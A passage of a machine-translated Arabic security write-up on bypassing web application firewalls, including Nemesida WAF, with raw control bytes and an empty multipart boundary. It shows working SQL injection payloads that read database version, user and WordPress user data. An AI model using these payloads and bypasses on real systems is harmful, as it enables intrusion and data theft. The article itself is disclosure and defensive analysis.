لذلك سيختار البضائع بالاسم <b>الهاتف</b> .  تتمتع طريقة الكشف عن الثغرات الأمنية هذه بميزة كبيرة أثناء اختبار تطبيق ويب محمي بواسطة WAF.  لا يعتبر رمز الاقتباس الفردي شذوذًا كافيًا في أحد المعلمات من قِبل معظم WAFs الحديثة ، لذلك يقومون بتمرير طلب به. <br><br>  لقد وصفنا اكتشاف نقاط الضعف ، ولكن ماذا عن تجاوز WAF واستغلال الثغرة الأمنية؟  بعد المرور ببعض الطرق الالتفافية ، وجدنا مشكلة في WAF.  اتضح أن WAF هذا عرضة للأحرف الخاصة المضافة إلى معلمات JSON.  في الواقع ، إذا أضفنا رموز JSON <b>0x0A أو 0x0D</b> (\ r \ n أو carrige reutrn and line new) بتنسيق خام ، دون أي تشفير ، في أي حقل نص ، فإن WAF سوف يجتازه ، وسيقوم تطبيق الويب بالنظر فيه إلى أن تكون صحيحة ومعالجتها.  على الأرجح ، كانت المشكلة في محلل JSON ، والذي لم يكن مخصصًا للرموز الخاصة ومحلل JSON الصحيح حتى مكان ظهور هذه الرموز فيه.  وبالتالي ، لن يحصل محلل WAF على الطلب الكامل ، لذلك يمكننا إدراج أي ناقل للهجوم بعد أحرف خاصة.  بالإضافة إلى فاصل الأسطر ، ستعمل الأحرف الأخرى (مثل NULL-byte) أيضًا.  ونتيجة لذلك ، يمكننا كتابة الطلب التالي ، والذي سيؤدي إلى إيقاف تشغيل WAF لأنه حاول التحقق من هذا الطلب (تم استبدال فاصل الأسطر وإرجاع النقل بتمثيل نصي): <br><br><pre style=";text-align:right;direction:rtl"> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"request"</span></span>:{<span class="hljs-attr"><span class="hljs-attr">"kill-waf"</span></span>:<span class="hljs-string"><span class="hljs-string">"die0x0A0x0D"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"Count"</span></span>:<span class="hljs-number"><span class="hljs-number">10</span></span>,<span class="hljs-attr"><span class="hljs-attr">"Offset"</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-attr"><span class="hljs-attr">"ItemName"</span></span>:[<span class="hljs-string"><span class="hljs-string">"'+(SELECT 'Phone'+CHAR(ASCII(substring(@@version,1,1))-24))+'"</span></span>]}}</code> </pre> <br>  <i>0x0A و 0x0D هي بايت الخام.</i> <br><br>  وبالتالي ، يمكننا بسهولة وسرعة اختبار جميع المعلمات عن أي نقاط ضعف (تم العثور على اثنين منهم في معلمات أخرى).  إن تجاوز WAF واستغلال هذا الحقن سمح لنا بالتسوية التامة لجميع مستخدمي تطبيق الويب. <br><br>  تم العثور على نفس المشكلات أيضًا في <b>Nemesida WAF</b> .  الفرق الوحيد هو أن الطلب لم يكن بترميز JSON ، لكنه كان طلب POST معتادًا مع المعلمات ، وتم تحديد المعلمة لاستعلام SQL كرقم.  إذا تم وضع بعض الرموز في طلب بتشفير عنوان url ، على سبيل المثال ، <b>٪ 03٪ 04 ، يقوم</b> WAF بحظر طلب ، ولكن إذا تم وضع الرموز في شكل أولي بدون تشفير عنوان url ، فسيتجاهل WAF هذا الطلب.  تجدر الإشارة إلى أنه تم وضع SQL- تعبير عادي لطلب وكذلك في WAF السابقة.  كان تعبير SQL بسيطًا <b>"UNION SELECT"</b> دون أي تشويش إضافي ، مما يعني أن WAF ببساطة لا يمكن تحليل الطلب بشكل صحيح ونقل التحليل إلى أبعد من ذلك.  ولكن هناك مشكلة واحدة - كيفية جعل بناء جملة استعلام SQL صحيحًا؟  لأن استخدام أحرف خاصة مثل <b>٪ 03٪ 04</b> في استعلام SQL غير صحيح.  الإجابة بسيطة - نحتاج فقط إلى استخدام التعليقات / ** /.  لذلك ، بدا طلب النتيجة كما يلي: <br><br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs"><span class="hljs-comment"><span class="hljs-comment">/*0x03 0x04*/</span></span>1 UNION <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span>(), <span class="hljs-keyword"><span class="hljs-keyword">user</span></span>() <span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  <i>0x03 و 0x04 هي بايتات خام.</i> <br><br>  أيضا ، تم العثور على مشكلة أخرى في Nemesida WAF.  كان يتعلق بمعالجة طلبات POST غير الصحيحة باستخدام بيانات متعددة الأجزاء / النماذج.  كما وصفنا أدناه ، في طلب HTTP مع بيانات متعددة الأجزاء / النموذج ، تكون <b>حدود</b> المعلمة مسؤولة عن الفصل بين المعلمات المختلفة في نص الطلب.  وفقًا لـ RFC ، يجب وضع حدود محددة مسبقًا مع بادئة تحتوي على <b>"-"</b> قبل كل معلمة POST جديدة ، حتى يتمكن الخادم من تمييز المعلمات المختلفة لطلب ما. <br>  لذلك ، كانت المشكلة أن الخادم و WAF تعاملوا مع الموقف بشكل مختلف عندما كانت المعلمة الحدود فارغة.  استنادًا إلى RFC ، في هذه الحالة ، ستكون الحدود بين المعلمات سلسلة من الأحرف <b>"-"</b> .  ومع ذلك ، استخدم WAF المحلل اللغوي الذي لا يأخذ في الاعتبار هذه الميزة ، وهذا هو السبب في WAF مرة أخرى تمرير الطلب ، لأن البيانات من معلمات طلب POST ببساطة لم تدخل وحدة التحليل ، وقام الخادم بتحليل هذا الموقف دون أي مشاكل ونقل البيانات إلى مزيد من المعالجة.  هذا طلب عينة لهذا الهجوم: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST /wp-content/plugins/answer-my-question/modal.php HTTP/1.1 Host: example.com Content-Type: multipart/form-data; boundary= Content-Length: 209 -- Content-Disposition: form-data; name="id" 1 UNION SELECT 1,2,3,CONVERT(version() USING utf8) AS name,CONVERT(user() USING utf8) AS name,6,7,8,9,10,11,12 FROM wp_users WHERE id=1 ----</code> </pre><br>  تم الإبلاغ عن كلتا المشكلتين إلى Pentestit ، حيث دفع الرجال مكافأة مقابل برنامج مكافآت الأخطاء لـ Nemesida WAF ، وحل المشكلات في أسرع وقت ممكن.  شكرا لهم على ذلك. <br><br>  كما نرى ، قد تكون WAFs حديثة وذكية ، لكن في بعض الأحيان يمكن تجاوزها فقط عن طريق إضافة شخصية خاصة واحدة.  لا يمكننا اليوم توقع جميع أنواع بيانات الإدخال الممكنة لجميع الخوادم في مرحلة التطوير ، والتعلم الآلي ، الذي تم تنفيذه للقيام بذلك بالضبط ، يتعثر على المحللون الذين تتعثر فيهم الأحرف الخاصة. <br><br><h2 style=";text-align:right;direction:rtl">  استنتاج </h2><br><img align="left" src="https://habrastorage.org/webt/59/e5/54/59e55464f2331285132470.png">  لذا ، هل يجب علينا الاعتماد بالكامل على WAF؟  <b>الجواب هو لا.</b> <br><br>  في إحدى عمليات التدقيق التي قمنا بها ، اكتشفنا تجاوز WAF الذي سمح لنا باستغلال بعض نقاط الضعف.  كما اتضح ، قام المطورون بالفعل بإجراء مراجعة لتطبيق الويب ، قبل حمايته بواسطة WAF ، وكشفوا عن نقاط الضعف نفسها.  بدلاً من إصلاحها ، قرروا شراء WAF الحديثة المجهزة بالتعلم الآلي.  من المؤسف أن بائع WAF لم يصر على إصلاح الثغرات الأمنية أولاً ؛  أو ربما اعتقد المطورون أنفسهم أن WAF سيكون خيارًا أفضل.  نحن لا نعرف بالتأكيد.  في كلتا الحالتين ، هذا مثال على ممارسة سيئة للغاية ، من جانب كل من المطورين والبائع.  تجدر الإشارة أيضًا إلى أن التعلّم الآلي لا يزال صندوقًا أسودًا ويبدو وكأنه جهاز تسويقي أكثر منه دفاع حقيقي. <br><br>  بشكل عام ، يعد WAF حلاً أمانًا حديثًا ، ولن يؤثر ذلك في تطبيقات الويب الخاصة بك.  على الرغم من أنه اليوم ، يمكنه فقط إعاقة عملية البحث عن الثغرات واستغلالها ، لكنه لا يستطيع حمايتها تمامًا.  كما هو الحال ، هذه هي حالة الفن لفترة طويلة.  لا يمكن إصلاح الثغرات الأمنية في تطبيقات الويب إلا بتصحيح الكود المتعلق بها ، وهذا هو الحل الوحيد المضمون. <br><br>  <b>المساهمون</b> <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ايليا بولاتوف</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" class="user_link">barracud4</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">دينيس ريبين</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" class="user_link">thefaeriedragon</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">الكسندر رومانوف</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" class="user_link">web_rock</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar454592/">https://habr.com/ru/post/ar454592/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar454582/index.html">يجب أن يتم تخزين طول مجموعة في متغير محلي في C #؟</a></li>
<li><a href="../ar454584/index.html">مدرسة تطوير الواجهة: تحليل مهام مينسك ومجموعة جديدة في موسكو</a></li>
<li><a href="../ar454586/index.html">حل الكلمات المتقاطعة اليابانية باستخدام P̶y̶t̶h̶o̶̶n̶ Rust و WebAssembly</a></li>
<li><a href="../ar454588/index.html">تدعوك Gazprom Neft إلى زيارة: اجتماع GPN Data Science Meetup</a></li>
<li><a href="../ar454590/index.html">زيمبرا التعاون جناح والتحكم المحمول مع ABQ</a></li>
<li><a href="../ar454596/index.html">النماذج العقلية في أمن المعلومات</a></li>
<li><a href="../ar454598/index.html">Serverless الهندسة المعمارية و microservices: مباراة مثالية؟</a></li>
<li><a href="../ar454600/index.html">كيف توصلنا إلى صفقة آمنة على Freelansim: أعط خيارًا ، وقم بقطع الميزات ، ومقارنة اللجان</a></li>
<li><a href="../ar454604/index.html">توليد تطبيق React مع واجهة الخلفية لـ GraphQL في دقائق</a></li>
<li><a href="../ar454606/index.html">ميزات سمة inputmode لنظام التشغيل المحمول والمتصفحات</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>